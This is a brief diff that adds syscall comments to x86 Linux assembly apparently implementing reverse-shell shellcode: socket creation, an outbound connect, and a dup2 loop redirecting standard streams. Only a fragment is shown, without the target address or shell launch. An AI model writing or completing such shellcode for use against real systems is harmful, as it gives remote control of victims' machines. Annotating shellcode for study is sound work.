@@ -18,8 +18,8 @@ _start:
 		
 	mov al, 0x66		; SYS_SOCKETCALL
 	xor ebx, ebx	
-	mov bl, 0x01
-	mov ecx, esp
+	mov bl, 0x01		; SYS_SOCKET
+	mov ecx, esp		
 	int 0x80
 
 	push 16
@@ -29,7 +29,7 @@ _start:
 	xor eax, eax
 	mov al, 0x66		; SYS_SOCKETCALL
 	xor ebx, ebx
-	mov bl, 0x03
+	mov bl, 0x03		; SYS_CONNECT
 	mov ecx, esp
 	int 0x80
 
@@ -37,7 +37,7 @@ _start:
 	xor eax, eax
 	xor ecx, ecx
 again:
-	mov al, 0x3f
+	mov al, 0x3f		; SYS_DUP2
 	int 0x80
 	inc ecx
 	cmp ecx, 0x03
